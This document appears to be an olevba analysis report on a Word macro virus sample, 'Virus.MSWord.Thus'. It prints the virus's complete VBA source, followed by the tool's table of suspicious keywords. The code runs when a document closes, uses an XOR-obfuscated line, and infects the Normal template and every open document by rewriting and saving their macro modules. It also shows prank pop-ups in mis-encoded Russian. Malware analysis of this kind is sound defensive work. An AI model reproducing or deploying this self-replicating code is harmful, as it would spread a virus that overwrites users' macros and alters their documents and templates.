olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.fd-53f0b6bccefdc7e752f0f319f258743c60f76579
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.fd-53f0b6bccefdc7e752f0f319f258743c60f76579 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'Camel
'=9$"#>c$?8>
?"9(.9$"#mpm
,!>(
Dim s, s1, SysInfected
s = ""
If (NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0) Or (NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Camel") Then
    s1 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1)
    For i = 2 To Len(s1)
     s = s + Chr(Asc(Mid(s1, i, 1)) Xor &H4D)
    Next i
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 11, s
    
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 11
    s = ""
    SysInfected = False
Else
    s1 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1)
    For i = 2 To Len(s1)
      s = s + Chr(Asc(Mid(s1, i, 1)) Xor &H4D)
    Next i
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 20, s
    
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 20
    SysInfected = True
End If
Set fs = CreateObject("Scripting.FileSystemObject")
p = Application.Options.DefaultFilePath(wdDocumentsPath) + "\Alc"
If fs.FileExists(p) Then fs.DeleteFile (p)
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Camel" Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines _
       1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents.Item(1).Export (p)
Else
   NormalTemplate.VBProject.VBComponents.Item(1).Export (p)
End If
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (p)
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 5
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Close()"
   End If

For i = 1 To Application.Documents.Count
  If Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Camel" Then
   Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule _
   .DeleteLines 1, _
   Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  End If
  If Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
     Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.AddFromFile (p)
     If SysInfected Then
      Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 5
      Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Open()"
     Else
      Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4
     End If
 End If
  If Not Application.Documents.Item(i).Saved Then Application.Documents.Item(i).Save
Next i
If fs.FileExists(p) Then fs.DeleteFile (p)
Randomize
k = Rnd
If k > 0.5 Then Exit Sub
zz = Array("Èâàíîâ Â.Ì. ß ñëåæó çà òîáîé! (Âîåíêîì)", "Âèòÿ! Õî÷åøü â àðìèþ? À âñå ðàâíî ïîéäåøü!", "Èâàíîâ Â.Ì.! Âàì ïîâåñòêà. Çàéäèòå íà ïî÷òó!")
r = Int((3) * Rnd)
With Assistant.NewBalloon
        .Heading = zz(r)
        .Button = msoButtonSetOK
        .Show
    End With
End Sub
















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

